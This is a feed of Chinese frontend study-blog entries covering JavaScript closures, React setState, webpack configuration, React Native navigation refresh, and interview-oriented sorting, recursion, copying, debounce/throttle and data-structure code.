<h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>上文我们介绍了<code>执行上下文</code>和<code>作用域链</code>，终于到了<code>闭包</code>。</p>
<p>ES5中变量只有两种作用域：函数外部，<code>全局变量</code>；函数内部，<code>局部变量</code>。且变量提升机制还会将变量声明提升到它所在作用域的顶端去执行。</p>
<p>函数内部的变量都是局部变量，在函数外部是<strong>无法访问</strong>的。</p>
<p>闭包其实就是充当一个桥梁的作用，从外部可以间接地访问到内部的变量。简单来讲，就是在一个函数内部返回另外函数，通过返回的函数去获取主函数内部的局部变量。</p>
<p>先看一段代码: </p>
<pre><code class="javascript">function outer() &#123;
  var private = 1;  // 局部变量
  return function () &#123;
    return private;
  &#125;
&#125;

console.log(private);  // private is not defined

var inner = outer();  // 将外层 outer 函数返回的匿名函数赋值给 inner
console.log(inner());  // 1</code></pre>
<p>在<code>outer</code>函数中定义的<code>private</code>局部变量，在函数外部直接访问是无法访问到的。但是我们在函数中能够访问这个局部变量，并通过一个<code>匿名函数</code>返回，在外边调用<code>outer()</code>接收这个匿名函数，并且赋值给外部的<code>inner</code>变量，再调用<code>inner()</code>即可获取到内部的<code>private</code>局部变量了。</p>
<p>打个比方，函数就好比是一个集装箱，外面的人拿不到里面的物资。这时候甩出来一个小背包，装着里面的部分物资，外面的人就可以在小背包中拿到了。</p>
<p>闭包可以隐藏函数内部细节，界定<code>公共变量 (public)</code>和<code>私有变量 (private)</code>。配合<code>匿名函数</code>和<code>立即执行函数</code>，常用来实现ES5中的<strong>模块化</strong>。</p>
<h5 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h5><p>正常函数执行完毕后，里面声明的变量被垃圾回收处理掉，但是闭包可以让作用域里的变量，在函数执行完之后依旧保持没有被垃圾回收处理掉，从而被外部访问。因此闭包也可以将临时变量“缓存”在内存中。</p>
<h5 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h5><p>前面提到闭包会暂存变量，不被垃圾回收，很直接的就会想到，闭包可能会造成<strong>内存泄漏</strong>。（很多文章都会这么说，包括我在面试中也讲到过。）</p>
<p>其实这个说法是不确切的，内存泄漏是指<code>不再使用的变量没有被释放</code>。而闭包函数中的<code>局部变量</code>，在之后是有可能使用的，并不是“垃圾变量”，所以称不上内存泄漏。</p>
<p>可以这么说，这一特性导致了闭包将会消耗额外的内存，因此谨慎使用。</p>
<h5 id="个人体会"><a href="#个人体会" class="headerlink" title="个人体会"></a>个人体会</h5><p>文中其实我还隐藏了很多细节。比如：执行上下文的概念对象<code>ExecutionContext</code>、作用域链中的<code>[[scope]]</code>等。有兴趣的话应该逐一地去深入了解。（详见文末链接）</p>
<p><code>执行上下文</code>、<code>作用域链</code>、<code>闭包</code>、<code>this</code>等概念。之前我是通过看面经的方式了解了点皮毛，所以面试过程中总是讲不清楚，一问一答就结束了。（我看你是完全不懂嘛）</p>
<p>后来我看了它们的实现原理，将它们理了一遍，感觉茅塞顿开，面试的时候就可以滔滔不绝了。其实这些概念都是一环扣一环的，串起来理解就会很直观。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><blockquote>
<p><a href="https://juejin.im/post/5ba32171f265da0ab719a6d7">[译] 理解 JavaScript 中的执行上下文和执行栈</a><br><a href="https://github.com/mqyqingfeng/Blog/issues/3">JavaScript深入之词法作用域和动态作用域</a><br><a href="https://github.com/mqyqingfeng/Blog/issues/6">JavaScript深入之作用域链</a><br><a href="https://zhuanlan.zhihu.com/p/56490498">我从来不理解JavaScript闭包，直到有人这样向我解释它…</a></p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>React - setState</title>
    <url>/2020/04/10/react-setState/</url>
    <content><![CDATA[<p>React中，对于<code>setState</code>的理解，以及获取同步更新状态的方法。</p>
<span id="more"></span>

<h3 id="异步原理"><a href="#异步原理" class="headerlink" title="异步原理"></a>异步原理</h3><p>之前看过一些文章，有这么个说法，<code>setState</code>在合成事件中是<code>“异步”更新</code>，在原生事件中是<code>“同步”更新</code>。这个说法没错，但总感觉怪怪的，直到看到了<code>鲨叔</code>的文章（文末链接），才彻底理解。</p>
<blockquote>
<p><code>批量更新</code>是因，<code>异步执行</code>是果。</p>
</blockquote>
<p>这里简单的提一下：在当前版本的<code>React</code>中，为了提升性能，会将多个<code>setState</code>进行合并更新，其实本身的代码上是<code>同步</code>的。只是<code>setState</code>和<code>获取状态</code>都是在<code>render()</code>前操作的，而合并更新又会进行一个短暂的调度延迟，所以我们获取<code>更新状态</code>的时候在感觉上是<code>“异步”</code>的。</p>
<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><p><code>setState</code>的第二个参数可以传入一个<code>回调函数</code>，会在状态更新完毕后触发，即可实现同步流程。也可以在第一个<code>setState</code>的回调函数中嵌入第二个<code>setState</code>，形成链式调用链，顺序是可控的。</p>
<pre><code class="javascript">this.setState(&#123;
  firstLoad: true,
&#125;, () =&gt; &#123;
  console.log(&#39;第一次更新完成&#39;)
  this.setState(&#123;
    secondLoad: true
  &#125;, () =&gt; &#123;
    console.log(&#39;第二次更新完成&#39;)
  &#125;)
&#125;);</code></pre>
<h5 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h5><p>通过<code>回调函数</code>控制同步更新的方式会产生代码嵌套，如果嵌套层数过多会感觉不太直观，也就是<code>回调地狱</code>。因此，我们也可以通过封装一个<code>Promise</code>，使用<code>async/await</code>的方式来改造它，其实本质上还是用了上文的<code>回调函数</code>。</p>
<pre><code class="javascript">setStateAsync(state) &#123;
  return new Promise((resolve) =&gt; &#123;
    this.setState(state, resolve)
  &#125;)
&#125;

async componentDidMount() &#123;
  const res = await fetch(&#39;/api/user/info&#39;)
  const &#123; username &#125; = res
  await this.setStateAsync(&#123; username: username &#125;)
&#125;</code></pre>
<h5 id="状态计算函数"><a href="#状态计算函数" class="headerlink" title="状态计算函数"></a>状态计算函数</h5><p>除了使用<code>回调函数</code>这种方式监听更新结果，我们也可以在<code>setState</code>的第一个参数中传入一个<code>状态计算函数</code>，而不是<code>普通对象</code>。函数中可以传入两个参数，<code>state</code>表示上一个状态值，<code>props</code>表示当前的状态。</p>
<pre><code class="javascript">this.setState((state, props) =&gt; (&#123;
  counter: state.counter + props.increment
&#125;))</code></pre>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><blockquote>
<p><a href="https://juejin.im/post/5e54eb72e51d4526cf47fa56">深入react的setState机制</a></p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>webpack - 学习笔记</title>
    <url>/2020/03/30/webpack-note/</url>
    <content><![CDATA[<p><code>webpack</code>学习笔记。</p>
<span id="more"></span>

<h3 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h3><p>昨天小伙伴一面阿里，面试官上来就<code>webpack</code>三连，直接问蒙。对于我们这些搬砖仔，平时项目一般都是直接开脚手架，根本没想到去碰<code>webpack</code>，即使需要配插件，也是按照官方文档照搬。不过，该学的还是得学。</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>webpack</code>大家应该很熟悉了，没用过肯定见过。简单的讲就是一个<code>静态模块打包器</code>，递归地构建项目依赖，然后打包输出。<code>webpack</code>可以自动的为我们打包项目，同时还能引入一些插件完成辅助功能，最终实现前端工程化。</p>
<p>安装:</p>
<pre><code class="bash">yarn webpack webpack-cli --save-dev</code></pre>
<p>安装成功后直接在项目目录新建一个配置文件<code>webpack.config.js</code>，内容类似于这样:</p>
<pre><code class="javascript">&#39;use strict&#39;

const path = require(&#39;path&#39;);

module.exports = &#123;
  entry: &#123;
    index: &#39;./src/app.js&#39;,
  &#125;,
  output: &#123;
    path: path.join(__dirname,&#39;dist&#39;),
    filename: &#39;app.js&#39;
  &#125;,
  mode: &#39;production&#39;,
&#125;;</code></pre>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>webpack</code>有四个核心概念，分别是<strong>入口 (entry)</strong>、<strong>出口 (output)</strong>、<strong>加载器 (loader)</strong>、<strong>插件 (plugins)</strong>，下面一一介绍:</p>
<h5 id="入口-entry"><a href="#入口-entry" class="headerlink" title="入口 (entry)"></a>入口 (entry)</h5><p>入口可以理解为打包的起点，<code>webpack</code>从入口开始，首先找到入口文件的相关依赖，再依次递归查找整个项目的依赖。入口可以有<em>一个</em>或者<em>多个</em>。</p>
<pre><code class="javascript">module.exports = &#123;
  entry: &#39;.src/app.js&#39;  //单入口
&#125;;</code></pre>
<pre><code class="javascript">module.exports = &#123;
  entry: &#123;  //多入口
    app: &#39;./src/app.js&#39;,
    vendors: &#39;./src/vendors.js&#39;
  &#125;
&#125;;</code></pre>
<h5 id="出口-output"><a href="#出口-output" class="headerlink" title="出口 (output)"></a>出口 (output)</h5><p>出口告诉<code>webpack</code>将打包后的文件输出到哪里，以及如何命名这些文件。</p>
<pre><code class="javascript">const path = require(&#39;path&#39;);

module.exports = &#123;
  output: &#123;
    path: path.resolve(__dirname, &#39;dist&#39;),  //输出到 dist 文件夹
    filename: &#39;bundle.js&#39;  //重命名为 bundle.js
  &#125;
&#125;;</code></pre>
<h5 id="加载器-loader"><a href="#加载器-loader" class="headerlink" title="加载器 (loader)"></a>加载器 (loader)</h5><p><code>webpack</code>自身只能处理<code>JS</code>文件，但是项目中肯定不只有JS。这时候就要用到加载器了，通过它可以将其他类型的文件转换为<code>webpack</code>能够处理的模块，例如<em>CSS</em>、<em>图片</em>、<em>文件</em>。</p>
<pre><code class="javascript">const config = &#123;
  module: &#123;
    rules: [
      &#123; 
        test: /\.scss$/,  //正则表达式匹配 CSS 文件
        use: [&#39;style-loader&#39;, &#39;css-loader&#39;, &#39;sass-loader&#39;]  //依次使用三个 loader，注意先后顺序
      &#125;
    ]
  &#125;
&#125;;</code></pre>
<h5 id="插件-plugins"><a href="#插件-plugins" class="headerlink" title="插件 (plugins)"></a>插件 (plugins)</h5><p>加载器只是简单地被用于转换某些类型的模块，而插件则可以用于执行范围更广的任务。例如<em>打包优化</em>、<em>压缩</em>、<em>变量重定义</em>等等。</p>
<pre><code class="javascript"></code></pre>
<h5 id="模式-mode"><a href="#模式-mode" class="headerlink" title="模式 (mode)"></a>模式 (mode)</h5><p>顺带提一下模式，我们可以使用模式来定义开发环境，<code>development</code>或<code>production</code>二选一，从而在不同的环境下定义不同的执行逻辑。</p>
<pre><code class="javascript">module.exports = &#123;
  mode: &#39;production&#39;  //定义生产环境
&#125;;</code></pre>
<h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><p>作为第二问，面试官肯定会让你报上常用的<code>loader</code>和<code>plugins</code>，奉上常用菜单。</p>
<h5 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h5><ul>
<li><p>file-loader<br>打包静态资源，蒋文君输出到打包文件夹中，代码中可以通过相对地址引入文件。</p>
</li>
<li><p>url-loader<br>类似<code>file-loader</code>，在文件很小的情况下以 base64 的方式把文件内容注入到代码中去。</p>
</li>
<li><p>image-loader<br>加载并且压缩图片文件。</p>
</li>
<li><p>babel-loader<br>将<code>ES6</code>代码转换为<code>ES5</code>代码。</p>
</li>
<li><p>ts-loader<br>编译<code>TS</code>文件并打包生成<code>ES5</code>代码。</p>
</li>
<li><p>eslint-loader<br>通过<code>ESLint</code>检查代码规范。</p>
</li>
<li><p>sass-loader<br>将<code>scss</code>文件编译为<code>CSS</code>。</p>
</li>
<li><p>css-loader<br>整理多个<code>CSS</code>文件之间的关系，最后打包成一个<code>CSS</code>文件。</p>
</li>
<li><p>style-loader<br>自动将<code>CSS</code>样式挂载到<code>HTML</code>文件的<code>style</code>标签中。</p>
</li>
</ul>
<h5 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h5><ul>
<li><p>html-webpack-plugin<br>自动生成<code>HTML</code>文件到输出目录，并且将打包后的<code>chunk</code>文件自动引入到<code>HTML</code>文件中。</p>
</li>
<li><p>uglifyjs-webpack-plugin<br>通过<code>UglifyES</code>压缩<code>ES6</code>代码</p>
</li>
</ul>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><h5 id="别名-alias"><a href="#别名-alias" class="headerlink" title="别名 (alias)"></a>别名 (alias)</h5><p>在代码中导入文件的时候，使用相对路径(<code>../../</code>)或绝对路径(<code>/</code>)会很麻烦。这时候我们可以配置一个别名来简化路径，例如常见的<code>@</code>或<code>~</code>表示根目录。</p>
<pre><code class="javascript">resolve: &#123;
  alias: &#123;
    &#39;@&#39;: path.resolve(__dirname, &#39;src&#39;),  //用 @ 表示根目录，下面同理
    utils: path.resolve(__dirname, &#39;src/utils&#39;),
    pages: path.resolve(__dirname, &#39;src/pages&#39;),
    components: path.resolve(__dirname, &#39;src/components&#39;),
    utils: path.resolve(__dirname, &#39;src/utils&#39;),
  &#125;
&#125;</code></pre>
<p>原理部分还在学习中，有时间补充……</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>RN - 页面跳转后刷新内容</title>
    <url>/2020/03/28/rn-navigation-refresh/</url>
    <content><![CDATA[<p><code>ReactNative</code>中使用<code>Navigation</code>页面跳转后刷新内容的常用方法。</p>
<span id="more"></span>

<h3 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h3><p>最近准备实习面试，把一些原理性的内容学习了一遍，对前端的认识又上升了一个层次。顺便把之前的项目重构了一遍，过去的代码真是不堪入目。正如第一次面试时面试官说的，“基础的东西弄明白了，找Bug也会快一点”。</p>
<p>之前做用户登录时遇到点小问题，登录成功后不刷新用户信息。逻辑如下：登录成功后获取到<code>token</code>，存入<code>redux</code>和<code>localStorage</code>，并且跳转到个人中心页面。个人中心页面在<code>componentDidMount</code>生命周期中请求后端获取用户信息并渲染。</p>
<p>当时以为是<code>localStorage</code>的缘故，因为<code>ReactNative</code>中的<code>localStorage</code>是异步的，于是用<code>Promise</code>封装了一下，模拟成了同步，问题依然没有解决。后来发现，原来是<code>Navigation</code>跳转页面后不会触发<code>componentDidMount</code>生命周期，所以才没有渲染内容。</p>
<h3 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h3><p>比较靠谱的方法是使用<code>React-Redux</code>来管理状态，执行顺序是<code>Connect (DATA AVAILABLE) -&gt; constructor &amp; componentWillMount &amp; componentDidMount</code>，即使在<code>RN</code>中没有<code>componentDidMount</code>也可以通过<code>connect</code>获取状态并更新。</p>
<p>所以可以将用户信息保存到<code>redux</code>，然后设置<code>connect</code>，通过<code>props</code>获取用户信息并触发渲染。或者只保存<code>token</code>，然后在<code>componentWillReceiveProps</code>生命周期中使用<code>nextProps</code>获取到<code>token</code>，再请求后端获取用户信息再渲染。</p>
<pre><code class="javascript">import &#123;connect&#125; from &#39;react-redux&#39;;

class My extends Component &#123;
  render() &#123;
    const &#123;user&#125; = this.props;
    if (user) &#123;
      return (
        &lt;View title=&quot;用户信息&quot; onPress=&#123;跳转编辑用户信息页面&#125; /&gt;
      );
    &#125; else &#123;
      return (
        &lt;View title=&quot;登录用户&quot; onPress=&#123;跳转登录页面&#125; /&gt;
      );
    &#125;
  &#125;
&#125;

const mapStateToProps = state =&gt; &#123;
  return &#123;
    token: state.user.token,
    user: state.user.user,
  &#125;;
&#125;;

export default connect(mapStateToProps)(My);</code></pre>
<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>如果不想使用<code>Redux</code>，也可以设置回调函数，然后在<code>Navigation</code>中通过参数传递回调函数并触发刷新，类似于子组件与父组件通过回调函数通信。</p>
<pre><code class="javascript">// A组件

export default class A extends Component &#123;
  refresh(state) &#123;
    this.setState(&#123;state: state&#125;)
  &#125;

  render() &#123;
    return (
      &lt;Button
          onPress=&#123; () =&gt; &#123;
            this.props.navigation.navigate(&#39;B&#39;, &#123;
              refresh: () =&gt; &#123; this.refresh() &#125;,
            &#125;)
          &#125;&#125;
      /&gt;
    )
  &#125;
&#125;</code></pre>
<pre><code class="javascript">// B组件

export default class B extends Component &#123;
  this.props.navigation.state.params.refresh(state)
&#125;</code></pre>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - 算法/数据结构</title>
    <url>/2020/03/11/js-structure-algorithm/</url>
    <content><![CDATA[<p>JavaScript数据结构和算法，面试手撕代码。</p>
<span id="more"></span>

<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p>这里基本语法选用<code>ES5</code>了，经测试<code>ES6</code>对性能影响蛮大的。</p>
<p>测试性能: 在执行前打上<code>console.time(label)</code>，执行后打上<code>console.timeEnd(label)</code>。</p>
<p>随机生成数组: </p>
<pre><code class="javascript">function randomArr(lower, upper, num) &#123;
  var arr = []
  for (var i = 0; i &lt; num; i++)
    arr.push(Math.floor(Math.random() * (lower - upper) + upper))
  return arr
&#125;

var arr = randomArr(1, 100, 10000)</code></pre>
<h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>156.190ms, O(n<sup>2</sup>), O(1), 稳定</p>
<pre><code class="javascript">function bubbleSort(arr) &#123;
  var len = arr.length
  for (var i = 0; i &lt; len; i++)
    for (var j = 0; j &lt; len - i - 1; j++)
      if (arr[j] &gt; arr[j + 1])
        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]
  return arr
&#125;</code></pre>
<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>60.689ms, O(n<sup>2</sup>), O(1), 稳定</p>
<pre><code class="javascript">function selectSort(arr) &#123;
  var len = arr.length
  for (var i = 0; i &lt; len; i++) &#123;
    var min = i
    for (var j = i; j &lt; len; j++) &#123;
      min = arr[j] &lt; arr[min] ? j : min
    &#125;
    [arr[i], arr[min]] = [arr[min], arr[i]]
  &#125;
  return arr
&#125;</code></pre>
<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p>14.673ms, O(nlog<sub>2</sub>n), O(nlog<sub>2</sub>n), 不稳定</p>
<pre><code class="javascript">function quickSort(arr) &#123;
  if (arr.length &lt;= 1) return arr
  var left = [], right = []
  var pivot = Math.floor(arr.length / 2)
  var pivotValue = arr.splice(pivot, 1)[0]
  for (var i = 0; i &lt; arr.length; i++) &#123;
    if (arr[i] &lt; pivotValue) &#123;
      left.push(arr[i])
    &#125; else &#123;
      right.push(arr[i])
    &#125;
  &#125;
  return [...quickSort(left), pivotValue, ...quickSort(right)]
&#125;</code></pre>
<h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><p>这里以n的阶乘为例。</p>
<h3 id="普通递归"><a href="#普通递归" class="headerlink" title="普通递归"></a>普通递归</h3><pre><code class="javascript">function factorial(n) &#123;
  if (n === 0)
    return 1
  return n * factorial(n - 1)
&#125;</code></pre>
<h3 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h3><p>由于普通递归过程中，每次执行都会将调用过程压入<code>调用栈</code>中，如果N的技术比较大，可能会栈溢出，所以这里提供尾递归方式解决这个问题。</p>
<pre><code class="javascript">function factorial(n, total = 1) &#123;
  if (n === 0)
    return total
  return factorial(n - 1, n * total)
&#125;</code></pre>
<p>注意！在<code>Node.js</code>中需要开启<code>harmony</code>模式实现尾递归，如下：</p>
<pre><code class="bash">node --harmony_tailcalls factorial.js</code></pre>
<blockquote>
<p><a href="https://github.com/HolyZheng/holyZheng-blog/issues/17">尾递归优化探索</a></p>
</blockquote>
<h1 id="拷贝"><a href="#拷贝" class="headerlink" title="拷贝"></a>拷贝</h1><p>基本数据类型: <code>undefined</code>，<code>boolean</code>，<code>number</code>，<code>string</code>，<code>null</code>, <code>symbol</code></p>
<p>存放在栈内存中的简单数据段，数据大小确定，内存空间大小可以分配，是直接按值存放的，所以可以直接访问。对其进行赋值时，拷贝的是值；修改后它的原始值是不会改变的。</p>
<p>引用类型: <code>object</code>, <code>array</code></p>
<p>引用类型是存放在堆内存中的，变量实际上是一个存放在栈内存的指针，这个指针指向堆内存中的地址。每个空间大小不一样，要根据情况开进行特定的分配。对其进行赋值时，拷贝的是地址空间；修改后它的原始值会一起改变。</p>
<table>
<thead>
<tr>
<th>—</th>
<th>和原数据是否指向同一对象</th>
<th>第一层数据为基本数据类型</th>
<th>原数据中包含子对象</th>
</tr>
</thead>
<tbody><tr>
<td>赋值</td>
<td>是</td>
<td>改变会使原数据一同改变</td>
<td>改变会使原数据一同改变</td>
</tr>
<tr>
<td>浅拷贝</td>
<td>否</td>
<td>改变不会使原数据一同改变</td>
<td>改变会使原数据一同改变</td>
</tr>
<tr>
<td>深拷贝</td>
<td>否</td>
<td>改变不会使原数据一同改变</td>
<td>改变不会使原数据一同改变</td>
</tr>
</tbody></table>
<p>示例对象:</p>
<pre><code class="javascript">const user = &#123;
  name: &#39;zhaoo&#39;,
  gender: 0,
  social: &#123;
    email: &#39;izhaoo@163.com&#39;,
    qq: &#39;894519210&#39;,
    wechat: undefined,
  &#125;,
  vip: null,
  friendId: [1, 43, 23, 21]
&#125;</code></pre>
<h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><pre><code class="javascript">user1 = user</code></pre>
<h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><h5 id="assign"><a href="#assign" class="headerlink" title="assign"></a>assign</h5><pre><code class="javascript">const user1 = Object.assign(&#123;&#125;, user)</code></pre>
<h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><h5 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h5><pre><code class="javascript">user1 = JSON.parse(JSON.stringify(user))</code></pre>
<h5 id="递归遍历"><a href="#递归遍历" class="headerlink" title="递归遍历"></a>递归遍历</h5><pre><code class="javascript">module.exports = function clone(target) &#123;
  if (typeof target === &#39;object&#39;) &#123;
    let cloneTarget = Array.isArray(target) ? [] : &#123;&#125;;
    for (const key in target) &#123;
      cloneTarget[key] = clone(target[key]);
    &#125;
    return cloneTarget;
  &#125; else &#123;
    return target;
  &#125;
&#125;;</code></pre>
<h1 id="防抖节流"><a href="#防抖节流" class="headerlink" title="防抖节流"></a>防抖节流</h1><h3 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h3><p>任务频繁触发的情况下，只有任务触发的间隔超过指定间隔的时候，任务才会执行</p>
<p>搜索补全</p>
<pre><code class="javascript">function debounce(fn) &#123;
  let timeout = null;
  return function() &#123;
    clearTimeout(timeout);
    timeout = setTimeout(() =&gt; &#123;
      fn.call(this, arguments);
    &#125;, 1000);
  &#125;;
&#125;</code></pre>
<h3 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h3><p>指定时间间隔内只会执行一次任务</p>
<p>懒加载监听滚动条位置、发送验证码计时器</p>
<pre><code class="javascript">function throttle(fn) &#123;
  let canRun = true;
  return function() &#123;
    if(!canRun) &#123;
      return;
    &#125;
    canRun = false;
    setTimeout( () =&gt; &#123;
      fn.call(this, arguments);
      canRun = true;
    &#125;, 1000);
  &#125;;
&#125;</code></pre>
<h1 id="手写源码"><a href="#手写源码" class="headerlink" title="手写源码"></a>手写源码</h1><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><pre><code class="javascript">//每个函数有this和args两个默认参数
Function.prototype.myCall = function (context) &#123;
  //传入的对象为空（null,number...）时指定为全局环境
  var context = context || window
  //用this获取调用myCall的函数
  //fn.call(a, &#39;yck&#39;, &#39;24&#39;) =&gt; this = fn
  context.fn = this
  //args是伪数组，没有slice这个方法
  var args = [...arguments].slice(1)
  //执行并保存结果
  var result = context.fn(...args)
  //删除这个fn对象
  delete context.fn
  //返回结果
  return result
&#125;</code></pre>
<h3 id="apply"><a href="#apply" class="headerlink" title="apply"></a>apply</h3><pre><code class="javascript">Function.prototype.myApply = function (context) &#123;
  var context = context || window
  context.fn = this
  var result
  if (arguments[1]) &#123;
    result = context.fn(...arguments[1])
  &#125; else &#123;
    result = context.fn()
  &#125;
  delete context.fn
  return result
&#125;</code></pre>
<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><pre><code class="javascript">Function.prototype.myBind = function (context) &#123;
  // if (typeof this !== &#39;function&#39;) &#123;
  //   throw new TypeError(&#39;Error&#39;)
  // &#125;
  var fn = this
  var args = [...arguments].slice(1)
  return function F() &#123;
    if (this instanceof F) &#123;
      return new fn(...args, ...arguments)
    &#125;
    return fn.apply(context, args.concat(...arguments))
  &#125;
&#125;</code></pre>
<h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><pre><code class="javascript">function new() &#123;
  let obj = new Object()
  let Constructor = [].shift.call(arguments)
  obj.__proto__ = Constructor.prototype
  let result = Constructor.apply(obj, arguments)
  return typeof result === &#39;object&#39; ? result : obj
&#125;

function student(name, gender) &#123;
  this.name = name
  this.gender = gender
&#125;

var zhaoo = new(student, &#39;zhaoo&#39;, &#39;male&#39;)</code></pre>
<ol>
<li>创建一个空的简单JavaScript对象（即{}）；</li>
<li>链接该对象（即设置该对象的构造函数）到另一个对象 ；</li>
<li>将步骤1新创建的对象作为this的上下文 ；</li>
<li>如果该函数没有返回对象，则返回this。</li>
</ol>
<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>后进先出 (LIFO)</p>
<pre><code class="javascript">class Stack &#123;
  constructor() &#123;
    this.stack = []
  &#125;
  push(item) &#123;
    this.stack.push(item)
  &#125;
  pop() &#123;
    this.stack.pop()
  &#125;
  peek() &#123;
    return this.stack[this.getCount() - 1]
  &#125;
  getCount() &#123;
    return this.stack.length
  &#125;
  isEmpty() &#123;
    return this.getCount() === 0
  &#125;
&#125;</code></pre>
<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>先进先出 (FIFO)</p>
<pre><code class="javascript">class Queue &#123;
  constructor() &#123;
    this.queue = []
  &#125;
  enQueue(item) &#123;
    this.queue.push(item)
  &#125;
  deQueue() &#123;
    return this.queue.shift()  //使用数组比较消耗性能
  &#125;
  getHeader() &#123;
    return this.queue[0]
  &#125;
  getLength() &#123;
    return this.queue.length
  &#125;
  isEmpty() &#123;
    return this.getLength() === 0
  &#125;
&#125;</code></pre>
<h3 id="优先级队列"><a href="#优先级队列" class="headerlink" title="优先级队列"></a>优先级队列</h3><pre><code class="javascript">class PriorityQueue &#123;
  constructor() &#123;
    this.queue = [&#123;
      priority
      value
    &#125;]
  &#125;
  enQueue(item) &#123;
    if (this.isEmpty()) &#123;
      this.queue.push(item)
    &#125; else &#123;
      var flag = false;  //判断是否排队
      for (let i = this.queue.length - 1; i &gt; 0; i--) &#123;
        if (this.queue[i].priority &lt;= item.priority) &#123;
          this.queue.splice(i, 0, item)
          flag = true
          break
        &#125;
      &#125;
      //循环后未入队，优先级最大，插入到第一位
      if (!flag) &#123;
        this.queue.unshift(item);
      &#125;
    &#125;
  &#125;
&#125;</code></pre>
<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><pre><code class="javascript">// 节点
function Node (el) &#123;
  this.el = el;
  this.next = null;
&#125;

// 构造函数
function Link () &#123;
  this.head = new Node(&#39;head&#39;);
&#125;

// 链表结尾追加一个节点
Link.prototype.append = function (el) &#123;
  var currNode = this.head;
  while (currNode.next != null) &#123;
    currNode = currNode.next;
  &#125;
  currNode.next = new Node(el);
&#125;

// 按节点的值查找节点
Link.prototype.find = function (el) &#123;
  var currNode = this.head;
  while (currNode &amp;&amp; currNode.el != el) &#123;
    currNode = currNode.next;
  &#125;
  return currNode;
&#125;

// 插入一个节点
Link.prototype.insert = function (newEl, oldEl) &#123;
  var newNode = new Node(newEl);
  var findNode = this.find(oldEl);
  if (findNode) &#123;
    newNode.next = findNode.next;
    findNode.next = newNode;
  &#125; else &#123;
    throw new Error(&#39;找不到给定插入的节点&#39;);
  &#125;
&#125;

// 展示链表中的元素
Link.prototype.display = function () &#123;
  var currNode = this.head.next;
  while (currNode) &#123;
    console.log(currNode.el);
    currNode = currNode.next;
  &#125;
&#125;

// 寻找给定节点的前一个节点
Link.prototype.findPrev = function (el) &#123;
  var currNode = this.head;
  while (currNode.next &amp;&amp; currNode.next.el !== el) &#123;
    currNode = currNode.next;
  &#125;
  return currNode;
&#125;

// 删除给定的节点
Link.prototype.remove = function (el) &#123;
  var prevNode = this.findPrev (el);
  if (prevNode.next != null) &#123;
    prevNode.next = prevNode.next.next;
  &#125; else &#123;
    throw new Error(&#39;找不到要删除的节点&#39;);
  &#125;
&#125;</code></pre>
<h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><pre><code class="javascript">
// 双链表构造函数
function DNode (el) &#123;
  this.el = el;
  this.prev = null;
  this.next = null;
&#125;

function DLink() &#123;
  this.head = new DNode(&#39;head&#39;);
&#125;

// 在链表结尾添加一个新的节点
DLink.prototype.append = function (el) &#123;
  var currNode = this.head;
  while (currNode.next != null) &#123;
    currNode = currNode.next;
  &#125;
  var newNode = new Node(el);
  newNode.next = currNode.next;
  newNode.prev = currNode;
  currNode.next = newNode;
&#125;

